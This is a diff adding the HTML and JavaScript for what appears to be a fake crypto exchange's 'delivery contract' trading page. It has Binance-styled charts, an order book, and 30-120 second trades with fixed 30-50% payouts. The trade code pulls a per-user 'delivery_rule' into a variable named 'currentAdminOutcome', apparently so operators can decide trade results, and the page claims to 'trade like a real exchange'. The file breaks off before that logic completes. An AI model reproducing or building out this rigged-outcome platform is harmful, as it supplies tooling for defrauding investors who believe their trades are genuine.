@@ -1,0 +1,1537 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YFI/USDT - Delivery Contract Trading</title>
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/brand/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/assets/brand/favicon-16x16.png">
+    <link rel="shortcut icon" href="/assets/brand/favicon.ico">
+    <link rel="apple-touch-icon" href="/assets/brand/apple-touch-icon.png">
+        <meta name="description" content="EasyCrypto Exchange - Perpetual, Spot and Delivery trading with real-time markets and secure KYC onboarding.">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="EasyCrypto Exchange">
+    <meta property="og:title" content="EasyCrypto Exchange | Perpetual, Spot & Delivery">
+    <meta property="og:description" content="Trade like a real exchange. Perpetual, Spot and Delivery contracts with a professional crypto interface.">
+    <meta property="og:image" content="https://YOUR_DOMAIN/assets/brand/og-preview.png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:url" content="https://YOUR_DOMAIN/">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="EasyCrypto Exchange | Perpetual, Spot & Delivery">
+    <meta name="twitter:description" content="Trade like a real exchange. Perpetual, Spot and Delivery contracts with a professional crypto interface.">
+    <meta name="twitter:image" content="https://YOUR_DOMAIN/assets/brand/og-preview.png">
+<script src="https://cdn.tailwindcss.com"></script>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
+
+        :root {
+            --bg-dark: #161a1e;
+            --bg-panel: #1e2329;
+            --bg-hover: #2a2e39;
+            --text-primary: #eaecef;
+            --text-secondary: #848e9c;
+            --up-color: #0ecb81;
+            --down-color: #f6465d;
+            --border-color: #2b3139;
+            --buy-green: #0ecb81;
+            --sell-red: #f6465d;
+        }
+
+        body {
+            background-color: var(--bg-dark);
+            color: var(--text-primary);
+            font-family: 'Roboto', sans-serif;
+            overflow: hidden;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar {
+            width: 4px;
+            height: 4px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--bg-dark);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #474d57;
+            border-radius: 2px;
+        }
+
+        .text-up {
+            color: var(--up-color);
+        }
+
+        .text-down {
+            color: var(--down-color);
+        }
+
+        .bg-up {
+            background-color: var(--up-color);
+        }
+
+        .bg-down {
+            background-color: var(--down-color);
+        }
+
+        .input-dark {
+            background-color: #2b3139;
+            border: 1px solid #474d57;
+            color: var(--text-primary);
+            border-radius: 4px;
+        }
+
+        .input-dark:focus {
+            outline: none;
+            border-color: #f0b90b;
+        }
+
+        .btn-long {
+            background-color: var(--up-color);
+            color: white;
+            font-weight: 500;
+        }
+
+        .btn-long:hover {
+            opacity: 0.9;
+        }
+
+        .btn-short {
+            background-color: #474d57;
+            color: var(--text-primary);
+            font-weight: 500;
+        }
+
+        .btn-short:hover {
+            opacity: 0.9;
+        }
+
+        .btn-buy {
+            background-color: #f0b90b;
+            color: #1e2329;
+            font-weight: 700;
+        }
+
+        .btn-buy:hover {
+            background-color: #d4a40a;
+        }
+
+        .tab-active {
+            color: #f0b90b;
+            border-bottom: 2px solid #f0b90b;
+        }
+
+        .order-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            font-size: 12px;
+            cursor: pointer;
+        }
+
+        .order-row:hover {
+            background-color: var(--bg-hover);
+        }
+
+        /* Range Slider Styling */
+        input[type=range] {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 100%;
+            background: transparent;
+        }
+
+        input[type=range]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            height: 14px;
+            width: 14px;
+            border-radius: 50%;
+            background: white;
+            cursor: pointer;
+            margin-top: -5px;
+            border: 2px solid #3275ff;
+            box-shadow: 0 0 2px rgba(0, 0, 0, 0.5);
+            position: relative;
+            z-index: 20;
+        }
+
+        input[type=range]::-webkit-slider-runnable-track {
+            width: 100%;
+            height: 4px;
+            cursor: pointer;
+            background: #2b3139;
+            border-radius: 2px;
+        }
+
+        /* Drawer Styling */
+        #market-drawer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 85%;
+            max-width: 350px;
+            height: 100%;
+            background-color: #1e2329;
+            z-index: 1000;
+            transform: translateX(-100%);
+            transition: transform 0.3s ease;
+            display: flex;
+            flex-direction: column;
+            border-right: 1px solid var(--border-color);
+            box-shadow: 4px 0 15px rgba(0, 0, 0, 0.5);
+        }
+
+        #market-drawer.open {
+            transform: translateX(0);
+        }
+
+        .drawer-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            z-index: 999;
+        }
+
+        .drawer-overlay.active {
+            display: block;
+            background: rgba(0, 0, 0, 0.7);
+        }
+
+        .market-list-row {
+            display: grid;
+            grid-template-columns: 1.5fr 1fr 1fr 1.2fr;
+            padding: 10px 16px;
+            font-size: 13px;
+            cursor: pointer;
+            align-items: center;
+        }
+
+        .market-list-row:hover {
+            background-color: var(--bg-hover);
+        }
+
+        .search-container {
+            padding: 16px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .search-input {
+            width: 100%;
+            background-color: #2b3139;
+            border: 1px solid #474d57;
+            border-radius: 4px;
+            padding: 8px 12px 8px 36px;
+            font-size: 14px;
+            color: var(--text-primary);
+        }
+
+        .search-icon {
+            position: absolute;
+            left: 28px;
+            top: 28px;
+            color: #848e9c;
+        }
+    </style>
+</head>
+
+<body class="relative">
+
+    <!-- Trade Countdown Modal -->
+    <div id="trade-modal" class="fixed inset-0 bg-black/70 z-[9999] hidden flex items-center justify-center">
+        <div class="bg-[#1e2329] w-80 rounded-lg shadow-2xl overflow-hidden border border-[#2b3139]">
+            <!-- Header -->
+            <div class="px-4 py-3 border-b border-[#2b3139] flex justify-between items-center">
+                <span class="text-[#eaecef] font-medium text-sm">Active Trade (<span id="modal-trade-type"
+                        class="uppercase">LONG</span>)</span>
+                <span id="modal-timer" class="text-[#f0b90b] font-bold text-lg">30s</span>
+            </div>
+
+            <!-- Body -->
+            <div class="p-4 space-y-4 text-sm">
+                <div class="flex justify-between">
+                    <span class="text-[#848e9c]">Asset</span>
+                    <span id="modal-asset" class="text-[#eaecef] font-medium">BTC/USDT</span>
+                </div>
+                <div class="flex justify-between">
+                    <span class="text-[#848e9c]">Entry Price</span>
+                    <span id="modal-entry-price" class="text-[#eaecef] font-medium">0.00</span>
+                </div>
+                <div class="flex justify-between">
+                    <span class="text-[#848e9c]">Current Price</span>
+                    <span id="modal-current-price" class="text-[#eaecef] font-medium">0.00</span>
+                </div>
+                <div class="flex justify-between border-t border-[#2b3139] pt-3 mt-3">
+                    <span class="text-[#848e9c]">Amount</span>
+                    <span id="modal-amount" class="text-[#eaecef]">0.00 USDT</span>
+                </div>
+                <div class="flex justify-between">
+                    <span class="text-[#848e9c]">Potential PnL</span>
+                    <span id="modal-pnl" class="text-[#848e9c]">Calculating...</span>
+                </div>
+            </div>
+
+            <!-- Trade Result Alert (Hidden initially) -->
+            <div id="modal-result-alert" class="hidden px-4 py-3 text-center font-bold text-sm">
+                <!-- Injected via JS -->
+            </div>
+
+            <!-- Footer -->
+            <div class="px-4 py-3 border-t border-[#2b3139]">
+                <button id="modal-close-btn"
+                    class="w-full bg-[#363c45] hover:bg-[#474d57] text-[#eaecef] py-2 rounded text-sm transition-colors hidden"
+                    onclick="closeTradeModal()">Close</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Market List Drawer Overlay -->
+    <div id="drawer-overlay" class="drawer-overlay"></div>
+
+    <!-- Market List Drawer -->
+    <aside id="market-drawer">
+        <div class="search-container relative">
+            <svg class="search-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                stroke-width="2">
+                <circle cx="11" cy="11" r="8"></circle>
+                <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+            </svg>
+            <input type="text" id="coin-search" placeholder="Search" class="search-input">
+        </div>
+
+        <div class="px-4 py-3 flex gap-4 text-sm font-medium border-b border-[#2b3139]">
+            <span class="text-[#3275ff]">USDT</span>
+        </div>
+
+        <div class="market-list-row text-[#848e9c] text-xs font-medium bg-[#161a1e] border-b border-[#2b3139]">
+            <div class="flex items-center gap-1">Pair <svg width="10" height="10" viewBox="0 0 24 24"
+                    fill="currentColor">
+                    <path d="M7 10l5 5 5-5z" />
+                </svg></div>
+            <div class="text-right flex items-center justify-end gap-1">Price <svg width="10" height="10"
+                    viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M7 10l5 5 5-5z" />
+                </svg></div>
+            <div class="text-right flex items-center justify-end gap-1">24h Change <svg width="10" height="10"
+                    viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M7 10l5 5 5-5z" />
+                </svg></div>
+            <div class="text-right flex items-center justify-end gap-1">Volume <svg width="10" height="10"
+                    viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M7 10l5 5 5-5z" />
+                </svg></div>
+        </div>
+
+        <div class="flex-1 overflow-y-auto" id="drawer-coin-list">
+            <!-- Coin items populated by JS -->
+        </div>
+    </aside>
+
+    <!-- Top Header Stats -->
+    <header class="h-14 border-b border-[#2b3139] flex items-center px-4 justify-between shrink-0">
+        <div class="flex items-center gap-8">
+            <div class="flex items-center gap-4">
+                <a href="markets.html" id="hamburger-btn" class="text-[#848e9c] hover:text-[#eaecef] flex items-center">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"
+                        stroke-linecap="round" stroke-linejoin="round">
+                        <line x1="3" y1="12" x2="21" y2="12"></line>
+                        <line x1="3" y1="6" x2="21" y2="6"></line>
+                        <line x1="3" y1="18" x2="21" y2="18"></line>
+                    </svg>
+                </a>
+                <div class="flex items-center gap-3">
+                    <h1 id="selected-pair" class="text-lg font-bold">BTC/USDT</h1>
+                    <span id="header-price" class="text-lg font-bold text-down">0.00</span>
+                    <span id="header-change" class="text-xs text-down">0.00%</span>
+                </div>
+            </div>
+            <div class="flex gap-8 text-xs">
+                <div>
+                    <div class="text-[#848e9c] mb-1">24h Low</div>
+                    <div id="header-low" class="text-[#eaecef]">0.00</div>
+                </div>
+                <div>
+                    <div class="text-[#848e9c] mb-1">24h High</div>
+                    <div id="header-high" class="text-[#eaecef]">0.00</div>
+                </div>
+                <div>
+                    <div class="text-[#848e9c] mb-1">24h Total</div>
+                    <div id="header-total" class="text-[#eaecef]">0.00</div>
+                </div>
+                <div>
+                    <div class="text-[#848e9c] mb-1">24h Amount(USDT)</div>
+                    <div id="header-amount" class="text-[#eaecef]">0.00</div>
+                </div>
+            </div>
+        </div>
+        <div class="flex items-center gap-3">
+            <button class="text-[#848e9c] hover:text-[#eaecef] p-1 transition-colors">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <line x1="18" y1="6" x2="6" y2="18"></line>
+                    <line x1="6" y1="6" x2="18" y2="18"></line>
+                </svg>
+            </button>
+        </div>
+    </header>
+
+    <!-- Main Content Grid -->
+    <div class="flex-1 flex overflow-hidden">
+
+        <!-- Left: Chart Area -->
+        <div class="flex-1 flex flex-col border-r border-[#2b3139] min-w-0">
+            <!-- Chart Toolbar -->
+            <div class="h-10 border-b border-[#2b3139] flex items-center px-2 gap-1 text-xs text-[#848e9c]"
+                id="timeframe-selector">
+                <span class="px-2 py-2 hover:text-[#eaecef] cursor-pointer" data-interval="1min">Time</span>
+                <span class="px-2 py-2 hover:text-[#eaecef] cursor-pointer active-time" data-interval="1min">1m</span>
+                <span class="px-2 py-2 hover:text-[#eaecef] cursor-pointer" data-interval="5min">5m</span>
+                <span class="px-2 py-2 font-bold text-[#eaecef] cursor-pointer" data-interval="15min">15m</span>
+                <span class="px-2 py-2 hover:text-[#eaecef] cursor-pointer" data-interval="30min">30m</span>
+                <span class="px-2 py-2 hover:text-[#eaecef] cursor-pointer" data-interval="1h">1H</span>
+                <span class="px-2 py-2 hover:text-[#eaecef] cursor-pointer" data-interval="4h">4H</span>
+                <span class="px-2 py-2 hover:text-[#eaecef] cursor-pointer" data-interval="1day">1D</span>
+                <span class="px-2 py-2 hover:text-[#eaecef] cursor-pointer" data-interval="1week">1W</span>
+                <span class="px-2 py-2 hover:text-[#eaecef] cursor-pointer" data-interval="1month">1M</span>
+
+                <div class="flex-1"></div>
+
+                <div class="flex gap-3 pr-2 border-l border-[#2b3139] pl-2">
+                    <span class="hover:text-[#eaecef] cursor-pointer chart-toggle active"
+                        data-type="MA">MA(5,10,30,60)</span>
+                    <span class="hover:text-[#eaecef] cursor-pointer chart-toggle" data-type="BOLL">BOLL</span>
+                    <span class="hover:text-[#eaecef] cursor-pointer chart-toggle active" data-type="VOL">VOL</span>
+                </div>
+            </div>
+
+            <!-- Chart Container -->
+            <div class="flex-1 relative bg-[#131415]" style="min-height: 450px; height: 450px;" id="chart-container">
+                <!-- Professional Binance Legend Overlay -->
+                <div id="chart-legend" class="absolute top-2 left-3 z-10 pointer-events-none flex flex-col gap-0.5"
+                    style="font-family: 'Roboto', sans-serif;">
+                    <div class="flex items-center gap-1.5 text-[12px] whitespace-nowrap">
+                        <span id="legend-pair-full" class="font-bold text-[#eaecef]">Bitcoin / TetherUS</span>
+                        <span class="text-[#848e9c]">路</span>
+                        <span id="legend-interval" class="text-[#848e9c]">15m</span>
+                        <span class="text-[#848e9c]">路</span>
+                        <span class="text-[#848e9c]">Binance</span>
+                        <div class="w-2 h-2 rounded-full bg-[#0ecb81] ml-1"></div>
+
+                        <div class="flex items-center gap-2 ml-2">
+                            <span class="text-[#848e9c]">O<span id="val-o"
+                                    class="text-[#eaecef] ml-0.5">0.00</span></span>
+                            <span class="text-[#848e9c]">H<span id="val-h"
+                                    class="text-[#eaecef] ml-0.5">0.00</span></span>
+                            <span class="text-[#848e9c]">L<span id="val-l"
+                                    class="text-[#eaecef] ml-0.5">0.00</span></span>
+                            <span class="text-[#848e9c]">C<span id="val-c"
+                                    class="text-[#eaecef] ml-0.5">0.00</span></span>
+                            <span id="val-chg" class="ml-1 text-[#f6465d]">-0.00 (-0.00%)</span>
+                        </div>
+                    </div>
+                    <div class="text-[11px] flex items-center gap-1">
+                        <span id="legend-vol-label" class="text-[#848e9c]">Vol 路 BTC</span>
+                        <span id="val-vol" class="text-[#f6465d]">0.00</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Chart Indicators Info -->
+            <div class="h-8 border-t border-[#2b3139] flex items-center px-4 gap-4 text-xs">
+                <span class="text-[#b7bdc6]">MA5: <span class="text-[#e3c099]" id="val-ma5">0.00</span></span>
+                <span class="text-[#b7bdc6]">MA10: <span class="text-[#ee534f]" id="val-ma10">0.00</span></span>
+                <span class="text-[#b7bdc6]">MA30: <span class="text-[#9b7eff]" id="val-ma30">0.00</span></span>
+                <span class="text-[#b7bdc6]">MA60: <span class="text-[#5391c6]" id="val-ma60">0.00</span></span>
+            </div>
+
+            <!-- Bottom Tabs -->
+            <div class="h-10 border-t border-[#2b3139] flex items-center px-4 gap-6 text-sm" id="bottom-tabs">
+                <div class="h-full flex items-center cursor-pointer text-[#f0b90b] border-b-2 border-[#f0b90b]"
+                    onclick="switchBottomTab('hold')">
+                    Hold a position(<span id="hold-count">0</span>)
+                </div>
+                <div class="h-full flex items-center cursor-pointer text-[#848e9c] hover:text-[#eaecef] border-b-2 border-transparent"
+                    onclick="switchBottomTab('history')">
+                    Historical Position
+                </div>
+                <div class="h-full flex items-center cursor-pointer text-[#848e9c] hover:text-[#eaecef] border-b-2 border-transparent"
+                    onclick="switchBottomTab('funds')">
+                    Funds
+                </div>
+            </div>
+
+            <!-- Tab Content Area -->
+            <div class="flex-1 overflow-y-auto relative">
+
+                <!-- Content: Hold a position -->
+                <div id="tab-content-hold" class="absolute inset-0 flex flex-col hidden active-tab">
+                    <div
+                        class="h-10 border-b border-[#2b3139] flex items-center px-4 text-xs text-[#848e9c] bg-[#1e2329] shrink-0">
+                        <div class="w-16">Coin</div>
+                        <div class="w-32">Opening time</div>
+                        <div class="w-16">Side</div>
+                        <div class="w-24">Amount</div>
+                        <div class="w-20">Fee</div>
+                        <div class="w-20">Delivery</div>
+                        <div class="w-24">Purchase price</div>
+                        <div class="w-24">Settlement price</div>
+                        <div class="w-24">Profit and loss</div>
+                        <div class="w-24">Expiration</div>
+                        <div class="flex-1 text-right">Action</div>
+                    </div>
+                    <div id="hold-position-list" class="flex-1 overflow-y-auto">
+                        <div id="no-open-positions" class="p-4 text-center text-[#848e9c] text-sm">No Open Positions
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Content: Historical Position -->
+                <div id="tab-content-history" class="absolute inset-0 flex flex-col hidden">
+                    <div
+                        class="h-10 border-b border-[#2b3139] flex items-center px-4 text-xs text-[#848e9c] bg-[#1e2329] shrink-0">
+                        <div class="w-16">Coin</div>
+                        <div class="w-32">Opening time</div>
+                        <div class="w-16">Side</div>
+                        <div class="w-24">Amount</div>
+                        <div class="w-24">Purchase price</div>
+                        <div class="w-24">Settlement price</div>
+                        <div class="w-24">Profit and loss</div>
+                        <div class="w-32">Settlement time</div>
+                        <div class="flex-1 text-right">Status</div>
+                    </div>
+                    <div id="historical-position-list" class="flex-1 overflow-y-auto">
+                        <div id="no-historical-records" class="p-4 text-center text-[#848e9c] text-sm">No Historical
+                            Records</div>
+                    </div>
+                </div>
+
+                <!-- Content: Funds -->
+                <div id="tab-content-funds" class="absolute inset-0 flex flex-col hidden">
+                    <div
+                        class="h-10 border-b border-[#2b3139] flex items-center px-4 text-xs text-[#848e9c] bg-[#1e2329] shrink-0">
+                        <div class="w-32">Asset</div>
+                        <div class="w-48">Total Balance</div>
+                        <div class="w-48">Available Balance</div>
+                        <div class="w-48">In Order</div>
+                        <div class="flex-1 text-right">Action</div>
+                    </div>
+                    <div class="flex-1 overflow-y-auto px-4 py-2">
+                        <div
+                            class="flex items-center text-sm text-[#eaecef] py-2 border-b border-[#2b3139] hover:bg-[#2b3139] transition-colors">
+                            <div class="w-32 font-bold">USDT</div>
+                            <div class="w-48">18,822,865.00</div>
+                            <div class="w-48">18,822,865.00</div>
+                            <div class="w-48">0.00</div>
+                            <div class="flex-1 text-right text-[#3275ff] cursor-pointer hover:underline">Deposit</div>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
+        <!-- Middle: Order Book & Trades -->
+        <div class="w-72 flex flex-col border-r border-[#2b3139] shrink-0">
+            <!-- Order Book -->
+            <div class="h-1/2 flex flex-col border-b border-[#2b3139]">
+                <div class="px-3 py-2 text-sm font-bold text-[#eaecef]">Order Book</div>
+                <div class="flex px-3 pb-1 text-xs text-[#848e9c] gap-1">
+                    <div class="w-1/3">Price(USDT)</div>
+                    <div class="w-1/3 text-right">Amount</div>
+                    <div class="w-1/3 text-right">Total</div>
+                </div>
+                <div class="flex-1 overflow-hidden relative">
+                    <div class="absolute inset-0 overflow-y-auto px-3 pb-2">
+                        <!-- Asks (Red) goes here -->
+                        <div id="orderbook-asks-container" class="flex flex-col justify-end min-h-[140px]">
+                        </div>
+
+                        <!-- Current Price -->
+                        <div
+                            class="py-2 flex items-center justify-between px-1 border-t border-b border-[#2b3139] my-1">
+                            <span id="orderbook-current-price" class="text-lg font-bold text-down">0.00</span>
+                            <span id="orderbook-current-usd" class="text-xs text-[#848e9c]">$0.00</span>
+                        </div>
+
+                        <!-- Bids (Green) goes here -->
+                        <div id="orderbook-bids-container" class="flex flex-col justify-start min-h-[140px]">
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Market Trades -->
+            <div class="h-1/2 flex flex-col">
+                <div class="px-3 py-2 text-sm font-bold text-[#eaecef]">Market Trades</div>
+                <div class="flex px-3 pb-1 text-xs text-[#848e9c] gap-1">
+                    <div class="w-1/3">Price(USDT)</div>
+                    <div class="w-1/3 text-right">Amount</div>
+                    <div class="w-1/3 text-right">Opening time</div>
+                </div>
+                <div class="flex-1 overflow-hidden relative">
+                    <div id="market-trades-container" class="absolute inset-0 overflow-y-auto px-3 pb-2">
+                        <!-- Dynamic Market Trades -->
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Right: Trading Sidebar -->
+        <div class="w-80 flex flex-col shrink-0 bg-[#161a1e] border-l border-[#2b3139]">
+            <div class="p-4 flex-1 overflow-y-auto space-y-5">
+                <!-- Section: Delivery contract -->
+                <div class="text-[#eaecef] text-[15px] font-medium mb-1">Delivery contract</div>
+
+                <!-- Buy Long / Buy Short Buttons -->
+                <div class="flex gap-2">
+                    <button id="btn-buy-long"
+                        class="flex-1 bg-[#62c58a] hover:opacity-90 text-white font-medium py-2 rounded text-sm transition-opacity"
+                        onclick="setTradeType('long')">Buy Long</button>
+                    <button id="btn-buy-short"
+                        class="flex-1 bg-[#474d57] hover:opacity-90 text-[#eaecef] font-medium py-2 rounded text-sm transition-opacity"
+                        onclick="setTradeType('short')">Buy Short</button>
+                </div>
+
+                <!-- Stats List -->
+                <div class="space-y-4 pt-2">
+                    <div class="flex justify-between text-sm items-center">
+                        <span class="text-[#848e9c]">Trading Assets</span>
+                        <span class="text-[#eaecef]">USDT</span>
+                    </div>
+                    <div class="flex justify-between text-sm items-center">
+                        <span class="text-[#848e9c]">Avbl Amount</span>
+                        <span class="text-[#eaecef]" id="avbl-amount">18822865 USDT</span>
+                    </div>
+                    <div class="flex justify-between text-sm items-center">
+                        <span class="text-[#848e9c]">Fee</span>
+                        <span class="text-[#eaecef]">0.5</span>
+                    </div>
+                    <div class="flex justify-between text-sm items-center">
+                        <span class="text-[#848e9c]">Minimum buy</span>
+                        <span class="text-[#eaecef]">100 USDT</span>
+                    </div>
+                </div>
+
+                <!-- Trading session -->
+                <div class="space-y-2 pt-2">
+                    <div class="text-[#848e9c] text-sm">Trading session</div>
+                    <div class="relative">
+                        <select id="trade-session"
+                            class="w-full bg-[#2b3139] border border-transparent rounded px-3 py-2.5 text-sm text-[#eaecef] appearance-none focus:outline-none focus:ring-1 focus:ring-[#3275ff] cursor-pointer">
+                            <option value="30">30s 30~30%</option>
+                            <option value="60">60s 40~40%</option>
+                            <option value="120">120s 50~50%</option>
+                        </select>
+                        <div class="absolute inset-y-0 right-3 flex items-center pointer-events-none">
+                            <svg class="w-4 h-4 text-[#eaecef]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                    d="M19 9l-7 7-7-7"></path>
+                            </svg>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Amount -->
+                <div class="space-y-2 pt-2">
+                    <div class="text-[#848e9c] text-sm">Amount</div>
+                    <input type="number" id="trade-amount" value="100"
+                        class="w-full bg-[#2b3139] border border-transparent rounded px-3 py-2.5 text-sm text-[#eaecef] focus:outline-none focus:ring-1 focus:ring-[#3275ff]">
+                </div>
+
+                <!-- Percentage Buttons -->
+                <div class="flex gap-2 pt-2">
+                    <button onclick="setPercentageAmount(0.25)"
+                        class="flex-1 bg-[#363c45] hover:bg-[#474d57] text-[#eaecef] py-2 rounded text-sm transition-colors border border-transparent">25%</button>
+                    <button onclick="setPercentageAmount(0.50)"
+                        class="flex-1 bg-[#363c45] hover:bg-[#474d57] text-[#eaecef] py-2 rounded text-sm transition-colors border border-transparent">50%</button>
+                    <button onclick="setPercentageAmount(0.75)"
+                        class="flex-1 bg-[#363c45] hover:bg-[#474d57] text-[#eaecef] py-2 rounded text-sm transition-colors border border-transparent">75%</button>
+                    <button onclick="setPercentageAmount(1.00)"
+                        class="flex-1 bg-[#363c45] hover:bg-[#474d57] text-[#eaecef] py-2 rounded text-sm transition-colors border border-transparent">100%</button>
+                </div>
+
+                <!-- Buy Button -->
+                <div class="pt-4">
+                    <button id="main-buy-button"
+                        class="w-full bg-[#62c58a] hover:opacity-90 text-white font-medium py-2.5 rounded text-sm transition-colors"
+                        onclick="placeTrade()">Buy Long</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <script type="module">
+        import { auth, db, doc, onSnapshot, onAuthStateChanged, getDoc, setDoc, updateDoc, collection, addDoc, serverTimestamp, increment, checkSession, enforceKycAccess } from './firebase-config.js';
+
+        window.db = db;
+        window.doc = doc;
+        window.getDoc = getDoc;
+        window.updateDoc = updateDoc;
+        window.collection = collection;
+        window.addDoc = addDoc;
+        window.serverTimestamp = serverTimestamp;
+        window.checkSession = checkSession;
+        window.onSnapshot = onSnapshot;
+
+        window.addEventListener('DOMContentLoaded', async () => {
+            await enforceKycAccess({
+                requireAuth: true,
+                unauthRedirect: 'login.html',
+                kycRedirect: 'mobile.html'
+            });
+        });
+
+        // Listen for auth to update available balance
+        onAuthStateChanged(auth, async (user) => {
+            if (user) {
+                onSnapshot(doc(db, 'users', user.uid), (docSnap) => {
+                    if (docSnap.exists()) {
+                        const data = docSnap.data();
+                        const balance = parseFloat(data.balance || 0).toFixed(2);
+                        const avblEl = document.getElementById('avbl-amount');
+                        if (avblEl) avblEl.textContent = balance + ' USDT';
+                    }
+                });
+            } else {
+                console.warn("User not authenticated.");
+            }
+        });
+    </script>
+    <script>
+        let currentTradeType = 'long';
+
+        function setTradeType(type) {
+            currentTradeType = type;
+            const btnLong = document.getElementById('btn-buy-long');
+            const btnShort = document.getElementById('btn-buy-short');
+            const mainBuyBtn = document.getElementById('main-buy-button');
+
+            if (type === 'long') {
+                btnLong.className = 'flex-1 bg-[#62c58a] hover:opacity-90 text-white font-medium py-2 rounded text-sm transition-opacity';
+                btnShort.className = 'flex-1 bg-[#474d57] hover:opacity-90 text-[#eaecef] font-medium py-2 rounded text-sm transition-opacity';
+                mainBuyBtn.className = 'w-full bg-[#62c58a] hover:opacity-90 text-white font-medium py-2.5 rounded text-sm transition-colors';
+                mainBuyBtn.textContent = 'Buy Long';
+            } else {
+                btnLong.className = 'flex-1 bg-[#474d57] hover:opacity-90 text-[#eaecef] font-medium py-2 rounded text-sm transition-opacity';
+                btnShort.className = 'flex-1 bg-[#f6465d] hover:opacity-90 text-white font-medium py-2 rounded text-sm transition-opacity';
+                mainBuyBtn.className = 'w-full bg-[#f6465d] hover:opacity-90 text-white font-medium py-2.5 rounded text-sm transition-colors';
+                mainBuyBtn.textContent = 'Buy Short';
+            }
+        }
+
+        function setPercentageAmount(percentage) {
+            const avblText = document.getElementById('avbl-amount').textContent;
+            // Extract the numbers from the "18822865 USDT" string
+            const avblNumber = parseFloat(avblText.replace(/[^0-9.]/g, ''));
+
+            if (!isNaN(avblNumber)) {
+                // Calculate the amount
+                const amount = avblNumber * percentage;
+                // Format amount to prevent too many decimal places
+                const formattedAmount = amount % 1 === 0 ? amount : parseFloat(amount.toFixed(4));
+
+                document.getElementById('trade-amount').value = formattedAmount;
+            }
+        }
+
+
+        // --- Bottom Tabs Logic ---
+        function switchBottomTab(tabId) {
+            // Update Tab UI styles
+            const tabs = document.getElementById('bottom-tabs').children;
+            for (let i = 0; i < tabs.length; i++) {
+                tabs[i].className = 'h-full flex items-center cursor-pointer text-[#848e9c] hover:text-[#eaecef] border-b-2 border-transparent';
+            }
+
+            // Set active tab style
+            let activeIndex = 0;
+            if (tabId === 'history') activeIndex = 1;
+            else if (tabId === 'funds') activeIndex = 2;
+
+            tabs[activeIndex].className = 'h-full flex items-center cursor-pointer text-[#f0b90b] border-b-2 border-[#f0b90b]';
+
+            // Hide all contents
+            document.getElementById('tab-content-hold').style.display = 'none';
+            document.getElementById('tab-content-history').style.display = 'none';
+            document.getElementById('tab-content-funds').style.display = 'none';
+
+            // Show selected content
+            document.getElementById(`tab-content-${tabId}`).style.display = 'flex';
+        }
+
+        // Initialize first tab presentation
+        document.addEventListener('DOMContentLoaded', () => {
+            switchBottomTab('hold');
+        });
+
+        // --- Original Code ---
+
+        // --- Trade Modal Logic ---
+        let activeTradeInterval = null;
+        let pnlPercentage = 0.30; // Default 30%
+        let tradeCounter = 0;
+        let activeTradeId = null;
+
+        let currentAdminOutcome = null;
+
+        async function placeTrade() {
+            const amountInput = parseFloat(document.getElementById('trade-amount').value);
+            if (isNaN(amountInput) || amountInput <= 0) {
+                alert("Please enter a valid amount.");
+                return;
+            }
+
+            // Get session info
+            const sessionSelect = document.getElementById('trade-session');
+            const totalSeconds = parseInt(sessionSelect.value); // 30, 60, or 120
+
+            // Determine percentage based on selection
+            if (totalSeconds === 30) pnlPercentage = 0.30;
+            else if (totalSeconds === 60) pnlPercentage = 0.40;
+            else if (totalSeconds === 120) pnlPercentage = 0.50;
+
+            // Get current market price from header 
+            const entryPriceStr = document.getElementById('header-price').textContent;
+            const entryPrice = parseFloat(entryPriceStr);
+
+            if (isNaN(entryPrice) || entryPrice <= 0) {
+                alert("Waiting for price data...");
+                return;
+            }
+
+            const user = window.checkSession ? await window.checkSession(false) : null;
+            if (!user) {
+                alert("Please log in to trade.");
+                window.location.href = "login.html";
+                return;
+            }
+
+            // Check enough balance
+            const userSnap = await window.getDoc(window.doc(window.db, 'users', user.uid));
+            const userData = userSnap.exists() ? userSnap.data() : {};
+            const currentBalance = parseFloat(userData.balance || 0);
+
+            if (amountInput > currentBalance) {
+                alert("Insufficient balance.");
+                return;
+            }
+
+            const inheritedRule = userData.delivery_rule && userData.delivery_rule !== 'normal' ? userData.delivery_rule : null;
+            currentAdminOutcome = inheritedRule;
+
+            // Save to Firestore
+            const tradeInfo = {
+                coin: currentSymbol.replace('/USDT', ''),
+                pair: currentSymbol,
